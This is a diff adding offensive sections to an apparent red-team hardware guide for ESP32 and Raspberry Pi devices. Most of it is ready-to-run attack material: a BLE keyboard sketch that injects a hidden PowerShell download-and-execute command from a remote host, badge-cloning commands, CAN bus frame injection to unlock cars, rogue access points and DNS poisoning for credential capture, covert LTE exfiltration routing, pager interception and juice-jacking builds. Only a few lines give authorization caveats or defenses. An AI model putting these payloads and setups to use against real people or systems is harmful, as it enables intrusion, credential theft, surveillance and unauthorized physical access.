@@ -618,6 +618,490 @@ strings firmware.bin | grep -i pass  # search for credentials
 
 ---
 
+## ESP32 — Bluetooth Exploitation
+
+### BLE Sniffing & Reconnaissance
+
+```bash
+# ESP32 with Ghost ESP or custom firmware for BLE reconnaissance
+
+# Ghost ESP BLE scanning
+blescan -a                     # raw BLE advertising capture
+blescan -f                     # BLE skimmer detection heuristics
+
+# nRF Sniffer (ESP32 alternative: use nRF52840 dongle with Wireshark)
+# ESP32 can capture BLE advertisements but not full connection sniffing
+# For full BLE MITM, use the nRF52840 dongle + Wireshark BLE plugin
+
+# ESP32 BLE tracker — passive surveillance
+# Tracks BLE MAC addresses over time to identify movement patterns
+# Useful for: physical surveillance during engagements
+# GitHub: github.com/cyberman54/ESP32-Paxcounter
+# Counts Wi-Fi + BLE devices passively (no transmission needed)
+
+# Flash Paxcounter
+platformio run --target upload --environment esp32dev
+# Web dashboard shows real-time device count + MAC diversity
+```
+
+### BLE Spam & Disruption
+
+```
+# Ghost ESP BLE spam attacks
+blespam -apple               # fake Apple device pop-ups (AirPods, AirTag, etc.)
+blespam -samsung              # fake Samsung device advertisements
+blespam -microsoft            # fake Microsoft Swift Pair notifications
+blespam -google               # fake Google Fast Pair notifications
+blespam -random               # cycle through all vendors randomly
+
+# Use cases:
+# - Distraction during physical penetration testing
+# - Demonstrate BLE notification fatigue to clients
+# - Test BLE-based access control resilience
+# - Flood area with fake AirTag advertisements
+
+spoofairtag                   # replicate a scanned AirTag's exact BLE payload
+aerialspoof 1 37.7 -122.4 50 # spoof drone Remote ID broadcast
+```
+
+### ESP32 BLE Keyboard Emulation
+
+```cpp
+// ESP32-S3 or ESP32 (classic BLE) can act as a Bluetooth HID keyboard
+// No USB connection required — pairs wirelessly to target device
+
+// Use the ESP32-BLE-Keyboard library
+// github.com/T-vK/ESP32-BLE-Keyboard
+
+#include <BleKeyboard.h>
+BleKeyboard bleKeyboard("Logitech KB", "Logitech", 100);
+
+void setup() {
+  bleKeyboard.begin();
+}
+
+void loop() {
+  if (bleKeyboard.isConnected()) {
+    // Wait for pairing, then inject keystrokes wirelessly
+    delay(5000);
+    bleKeyboard.press(KEY_LEFT_GUI);
+    bleKeyboard.press('r');
+    bleKeyboard.releaseAll();
+    delay(500);
+    bleKeyboard.println("powershell -w hidden -ep bypass -c \"IEX(IWR http://10.10.14.5/s.ps1)\"");
+    delay(30000); // don't repeat
+  }
+}
+
+// Attack scenario:
+// 1. ESP32-S3 advertises as "Logitech KB" or "Apple Keyboard"
+// 2. Target device auto-pairs (if Bluetooth is in discoverable/pairable mode)
+// 3. ESP32 injects keystrokes wirelessly — no USB cable needed
+// 4. Works against phones, tablets, laptops with BLE enabled
+
+// Limitations:
+// - Requires target to accept BLE pairing (notification pops up)
+// - Modern OS requires explicit user approval for HID pairing
+// - Best paired with social engineering ("try this new keyboard")
+```
+
+---
+
+## ESP32 — RFID & Badge Cloning
+
+```bash
+# ESP32 + PN532 or RC522 NFC/RFID module = portable badge cloner
+# Read 125 kHz (HID ProxCard) and 13.56 MHz (MIFARE, DESFire, iCLASS)
+
+# Wiring (ESP32 + PN532 via SPI):
+# ESP32 GPIO18 (SCK)  → PN532 SCK
+# ESP32 GPIO19 (MISO) → PN532 MISO
+# ESP32 GPIO23 (MOSI) → PN532 MOSI
+# ESP32 GPIO5  (SS)   → PN532 SS
+# ESP32 3.3V → PN532 VCC
+# ESP32 GND  → PN532 GND
+
+# Arduino sketch to read NFC UID
+# Use Adafruit_PN532 library
+# Reads card UID when presented — logs to serial or SD card
+
+# ESP32 + Wiegand reader (for 125 kHz proximity cards):
+# Tap into Wiegand data lines (D0, D1) at a card reader
+# ESP32 captures the Wiegand bitstream (26-bit or 34-bit)
+# Replay later with a Proxmark3 or custom Wiegand emitter
+
+# Complete badge cloning workflow:
+# 1. Position ESP32 + PN532 near a legitimate card reader or in a bag
+# 2. Social engineer target: "can I see your badge for a moment?"
+# 3. ESP32 reads the card UID and stores it
+# 4. Clone to a blank T5577 card using Proxmark3:
+#    proxmark3> lf hid clone --id 2004AABBCC
+# 5. Use cloned badge to access secured areas
+```
+
+---
+
+## ESP32 — CAN Bus & Automotive Attacks
+
+```bash
+# ESP32 + MCP2515 CAN transceiver = automotive attack platform
+# Read and inject CAN bus frames for vehicle testing
+
+# Wiring (ESP32 + MCP2515):
+# ESP32 GPIO5 (CS)    → MCP2515 CS
+# ESP32 GPIO23 (MOSI) → MCP2515 SI
+# ESP32 GPIO19 (MISO) → MCP2515 SO
+# ESP32 GPIO18 (SCK)  → MCP2515 SCK
+# ESP32 GPIO4 (INT)   → MCP2515 INT
+# ESP32 3.3V → MCP2515 VCC
+# ESP32 GND  → MCP2515 GND
+
+# Connect CAN-H and CAN-L to the vehicle's OBD-II port (pins 6 and 14)
+# Or tap directly into CAN bus wires behind the dashboard
+
+# Arduino library: github.com/sandeepmistry/arduino-CAN or mcp_can
+
+# Read CAN frames (passive sniffing)
+# Monitor all traffic on the bus — identify control frames
+# Look for: door locks, ignition, instrument cluster, TPMS
+
+# Inject CAN frames (active attack)
+# Replay captured frames to trigger actions:
+# - Unlock doors
+# - Disable immobilizer
+# - Trigger instrument cluster warnings
+# - Manipulate speedometer reading
+
+# SavvyCAN (PC software) + ESP32 running GVRET firmware:
+# github.com/collin80/SavvyCAN
+# ESP32 becomes a Wi-Fi CAN bridge — SavvyCAN connects over the network
+# Full CAN bus analysis, filtering, and injection from laptop
+
+# OPSEC: CAN bus has no authentication — any device on the bus can send any frame
+# Modern vehicles are adding CAN-FD and gateway ECUs to segment the bus
+```
+
+---
+
+## Raspberry Pi — WPA-Enterprise Credential Capture
+
+```bash
+# EAPHammer — rogue AP that captures WPA-Enterprise (802.1X) credentials
+# Targets PEAP, EAP-TTLS, EAP-TLS enterprise Wi-Fi networks
+# github.com/s0lst1c3/eaphammer
+
+# Install on Raspberry Pi (Kali ARM)
+git clone https://github.com/s0lst1c3/eaphammer.git
+cd eaphammer
+./kali-setup
+
+# Generate rogue certificates
+./eaphammer --cert-wizard
+
+# Launch rogue AP targeting WPA-Enterprise
+./eaphammer -i wlan0 --auth wpa-enterprise --essid "CorpWiFi" \
+  --creds --channel 6
+
+# What happens:
+# 1. EAPHammer clones the corporate SSID
+# 2. Deauths clients from the real AP (requires monitor mode adapter)
+# 3. Clients reconnect to the rogue AP
+# 4. During EAP negotiation, captures:
+#    - MSCHAPv2 challenge/response (crackable with hashcat -m 5500)
+#    - Cleartext credentials (if EAP-GTC is negotiated)
+#    - Certificate details
+# 5. Credentials logged to database
+
+# Crack captured MSCHAPv2 hashes
+hashcat -m 5500 captured_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# hostapd-mana (alternative — raw hostapd with MANA patches)
+# More manual setup but finer control
+# github.com/sensepost/hostapd-mana
+```
+
+---
+
+## Raspberry Pi — Covert Exfiltration via LTE
+
+```bash
+# Add a USB LTE modem to any Pi implant for independent network access
+# Bypasses all corporate network monitoring — traffic goes direct to cellular
+
+# Recommended modems:
+# - Quectel EC25 (Mini PCIe or USB dongle) — reliable, well-supported
+# - Huawei E3372h — common, plug-and-play on Linux
+# - Sierra Wireless EM7455 — enterprise grade
+# - ZTE MF833V — cheap, works well
+
+# Setup (Huawei E3372h example)
+apt install usb-modeswitch network-manager
+# Plug in modem — should auto-detect as wwan0 or usb0
+
+# NetworkManager (recommended)
+nmcli connection add type gsm con-name "LTE" ifname "*" apn "internet"
+nmcli connection up "LTE"
+
+# Or manual (if NM unavailable)
+usb_modeswitch -v 12d1 -p 14fe -M '55534243...'
+ip link set wwan0 up
+udhcpc -i wwan0
+
+# Verify connectivity
+curl -s --interface wwan0 ifconfig.me
+
+# Route offensive traffic through LTE (keep Ethernet for internal access)
+# Two interfaces: eth0 (corporate network) + wwan0 (LTE for C2)
+ip route add default via <lte_gateway> dev wwan0 table 100
+ip rule add fwmark 0x1 table 100
+iptables -t mangle -A OUTPUT -p tcp --dport 51820 -j MARK --set-mark 0x1
+# WireGuard C2 traffic goes out LTE; everything else stays on corporate network
+
+# Operational advantages:
+# - C2 traffic never touches corporate network — invisible to SIEM/IDS
+# - Even if the Pi is discovered, C2 infrastructure is separate from target network
+# - Data exfiltration goes direct to cellular — no proxy/firewall inspection
+# - Pi can operate entirely off LTE if no Ethernet is available
+
+# Power considerations:
+# LTE modem draws 500-800mA — ensure power supply can handle it
+# Pi 4 + LTE modem needs minimum 3A USB-C supply
+# Battery pack: 20,000 mAh = ~12-18 hours runtime with LTE active
+```
+
+---
+
+## Raspberry Pi — Signal Intelligence (SDR)
+
+```bash
+# RTL-SDR dongle ($25) + Raspberry Pi = portable signals intelligence platform
+# Receive: 24 MHz to 1.7 GHz (covers FM radio, ADS-B, pagers, POCSAG, trunked radio)
+
+# Install RTL-SDR tools
+apt install rtl-sdr gqrx-sdr gnuradio
+
+# Test dongle
+rtl_test -t
+
+# Capture and decode pager traffic (POCSAG)
+# Many hospitals, businesses still use unencrypted pagers
+apt install multimon-ng
+rtl_fm -f 152.480M -s 22050 -g 50 | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -f alpha -
+# Output: decoded pager messages in plaintext
+# Content often includes: patient names, codes, internal communications
+
+# ADS-B aircraft tracking (1090 MHz)
+apt install dump1090-mutability
+dump1090-mutability --interactive --net
+# View aircraft positions at http://pi-ip:8080
+
+# Capture radio communications (analog FM)
+rtl_fm -f 460.500M -M fm -s 12500 -r 48000 | aplay -r 48000 -f S16_LE
+
+# Trunked radio decoding (P25 digital)
+# Use OP25: github.com/boatbod/op25
+# Decode public safety (police, fire, EMS) digital radio
+
+# Wi-Fi monitoring (with compatible SDR — not RTL-SDR)
+# SDR can capture raw 802.11 frames for analysis
+
+# Operational uses:
+# - Listen to security guard radio communications during physical pentest
+# - Decode pager messages for intelligence gathering
+# - Monitor building management system wireless (BACnet, Zigbee)
+# - Track personnel via radio traffic patterns
+# - Verify wireless alarm system frequencies before entry
+
+# IMPORTANT: Intercepting radio communications may violate wiretapping laws
+# Ensure your engagement authorization covers RF interception
+```
+
+---
+
+## Raspberry Pi — Rogue DHCP & DNS for Network Interception
+
+```bash
+# Pi as a rogue DHCP server on a corporate network
+# Races the legitimate DHCP server to hand out attacker-controlled DNS/gateway
+# All victim DNS queries route through the Pi → credential capture, MITM
+
+# Install
+apt install isc-dhcp-server dnsmasq mitmproxy
+
+# /etc/dhcp/dhcpd.conf — rogue DHCP config
+default-lease-time 60;         # short lease to get victims faster
+max-lease-time 120;
+authoritative;                 # aggressively respond to DHCP requests
+
+subnet 10.0.0.0 netmask 255.255.255.0 {
+  range 10.0.0.200 10.0.0.250; # use a range unlikely to conflict
+  option routers 10.0.0.1;     # real gateway (or Pi if doing MITM)
+  option domain-name-servers 10.0.0.99;  # Pi's IP — all DNS goes through us
+}
+
+# Start rogue DHCP
+dhcpd -cf /etc/dhcp/dhcpd.conf eth0
+
+# dnsmasq for selective DNS poisoning
+# /etc/dnsmasq.d/poison.conf
+address=/login.microsoftonline.com/10.0.0.99   # redirect to our phishing page
+address=/mail.company.com/10.0.0.99            # redirect webmail
+server=8.8.8.8                                 # forward everything else legitimately
+
+systemctl start dnsmasq
+
+# mitmproxy for intercepting HTTP/HTTPS traffic
+mitmproxy --mode transparent --listen-host 10.0.0.99 -p 8080
+# Requires victims to trust the mitmproxy CA — more useful for HTTP
+# For HTTPS: combine with sslstrip or Evilginx-style AiTM
+
+# Bettercap alternative (all-in-one)
+bettercap -iface eth0
+> set dhcp6.spoof.domains *
+> dhcp6.spoof on
+> set dns.spoof.domains login.microsoftonline.com
+> dns.spoof on
+```
+
+---
+
+## Raspberry Pi — Portable MITM Proxy
+
+```bash
+# Pi as a transparent MITM proxy for intercepting mobile app traffic
+# Place Pi between target device and network (Wi-Fi AP + upstream Ethernet)
+
+# Setup: Pi creates Wi-Fi AP, routes to corporate Ethernet
+# wlan0 = AP (target connects here)
+# eth0 = upstream (corporate network)
+
+apt install hostapd dnsmasq mitmproxy
+
+# hostapd AP config (see Evil Twin section for full config)
+# Key difference: this is transparent interception, not credential capture
+
+# IP forwarding and NAT
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+# Redirect HTTP/HTTPS through mitmproxy
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+# Run mitmproxy in transparent mode
+mitmproxy --mode transparent --listen-port 8080 --ssl-insecure
+
+# For mobile app testing:
+# 1. Install mitmproxy CA cert on target device
+# 2. Connect device to Pi's Wi-Fi AP
+# 3. All HTTP/HTTPS traffic flows through mitmproxy
+# 4. Inspect API calls, auth tokens, session cookies in real time
+
+# Automated credential extraction
+mitmdump --mode transparent --listen-port 8080 -s credential_sniffer.py
+# credential_sniffer.py filters for login forms, API tokens, cookies
+```
+
+---
+
+## Raspberry Pi — Physical Security Augmentation
+
+```bash
+# Pi + Proxmark3 = portable badge cloning station
+# Connect Proxmark3 via USB to Pi, operate remotely over SSH/tunnel
+
+apt install proxmark3
+
+# Read a badge (125 kHz HID ProxCard)
+proxmark3> lf search              # auto-detect card type
+proxmark3> lf hid read            # read HID credential
+proxmark3> lf hid clone -r 2004AABBCC   # clone to T5577 blank card
+
+# Read a badge (13.56 MHz MIFARE Classic)
+proxmark3> hf search              # auto-detect card type
+proxmark3> hf mf autopwn          # automated MIFARE Classic key recovery + dump
+
+# Pi + USB camera = covert badge photography
+# Capture badge photos for visual cloning or number extraction
+# fswebcam (lightweight USB webcam capture)
+apt install fswebcam
+fswebcam -r 1280x720 --no-banner /tmp/badge_$(date +%s).jpg
+
+# Pi + relay board = electronic lock bypass
+# 4-channel relay connected to GPIO can:
+# - Bypass mag-lock power (interrupt 12V/24V supply)
+# - Simulate REX (Request to Exit) sensor activation
+# - Control electric strike remotely via SSH
+# IMPORTANT: only with explicit authorization in physical pentest scope
+
+# Pi as a network-connected USB drop
+# Disguise Pi Zero 2W inside:
+# - USB wall charger (appears to be charging a phone)
+# - Network switch (3D-printed case that looks like a small switch)
+# - Power strip (Pi hidden inside, powered by mains)
+# - Under a desk (double-sided tape, powered by USB port)
+```
+
+---
+
+## ESP32 — Rogue Charging Station
+
+```bash
+# ESP32-S2/S3 in a charging cable or station
+# When a phone connects to charge, the ESP32:
+# 1. Attempts USB data connection (juice jacking)
+# 2. If data connection succeeds: HID injection on phone
+# 3. Simultaneously runs Wi-Fi attacks (evil portal, deauth)
+
+# Build: ESP32-S3 + USB-C female breakout board + 3D-printed enclosure
+# The ESP32 sits between the charging cable and the phone
+
+# Android HID injection (if USB debugging or OTG enabled)
+# ESP32-S3 acts as USB keyboard, types commands on unlocked Android phone:
+# - Open Chrome, navigate to payload URL
+# - Open terminal emulator, run commands
+# - Modify Wi-Fi settings
+
+# Operational deployment:
+# - Conference room charging station
+# - Hotel lobby or airport charging kiosk
+# - Shared workspace charging cables
+# - "Free charging" station at events
+
+# Defense: USB data blockers ("USB condoms") prevent data pins from connecting
+# Modern phones show "Trust this computer?" prompt before allowing data
+# iOS requires explicit trust + unlock; Android varies by manufacturer
+```
+
+---
+
+## Combined ESP32 + Raspberry Pi Deployments
+
+```bash
+# ESP32 as remote trigger for Raspberry Pi implant
+# ESP32 monitors for attacker's phone BLE beacon
+# When detected, ESP32 signals Pi via GPIO or serial to activate payload
+# Prevents the Pi from running attacks until the operator is on-site
+
+# Architecture:
+# ESP32 (BLE scanner) → GPIO pin → Pi (runs attack toolkit)
+# ESP32 scans for specific BLE UUID advertisement from attacker's phone
+# When UUID is seen: pull GPIO high → Pi wakes from sleep and starts C2
+
+# ESP32 as Wi-Fi probe for Raspberry Pi
+# ESP32 runs Marauder/Ghost ESP for Wi-Fi recon
+# Feeds discovered SSIDs, clients, and probes to Pi over serial
+# Pi uses this intelligence to configure targeted evil twin attacks
+# Pi has the horsepower (hostapd, EAPHammer); ESP32 has the RF flexibility
+
+# Multi-ESP32 mesh for building coverage
+# Deploy 3-5 ESP32s (running Ghost ESP or Marauder) across a building
+# Each reports to a central Pi over ESP-NOW (peer-to-peer, no AP needed)
+# Pi aggregates: complete picture of all Wi-Fi clients, their movements,
+# which SSIDs they probe for, and BLE device tracking
+# Range: ESP-NOW reaches ~200m LOS between ESP32 nodes
+```
+
 ## Detection Signals
 
 ```
@@ -661,11 +1145,19 @@ UART / JTAG access:
 - ESP8266 Deauther — `github.com/SpacehuhnTech/esp8266_deauther`
 - UltraWiFiDuck — `github.com/EmileSpecialProducts/UltraWiFiDuck`
 - WiFiDuck — `github.com/SpacehuhnTech/WiFiDuck`
+- ESP32-BLE-Keyboard — `github.com/T-vK/ESP32-BLE-Keyboard`
+- ESP32-Paxcounter — `github.com/cyberman54/ESP32-Paxcounter`
 - P4wnP1 A.L.O.A. — `github.com/mame82/P4wnP1_aloa`
 - Pwnagotchi (maintained fork) — `github.com/jayofelony/pwnagotchi`
 - WiEvil (Pi evil twin) — `github.com/exfil0/WiEvil`
+- EAPHammer — `github.com/s0lst1c3/eaphammer`
+- hostapd-mana — `github.com/sensepost/hostapd-mana`
+- SavvyCAN (CAN bus analysis) — `github.com/collin80/SavvyCAN`
 - PiRogue Tool Suite — `pts-project.org`
 - OpenOCD — `openocd.org`
 - JTAGenum — `github.com/cyphunk/JTAGenum`
 - Flashrom — `flashrom.org`
 - hcxtools — `github.com/ZerBea/hcxtools`
+- multimon-ng (pager decoding) — `github.com/EliasOeworthy/multimon-ng`
+- OP25 (P25 trunked radio) — `github.com/boatbod/op25`
+- Bettercap — `github.com/bettercap/bettercap`
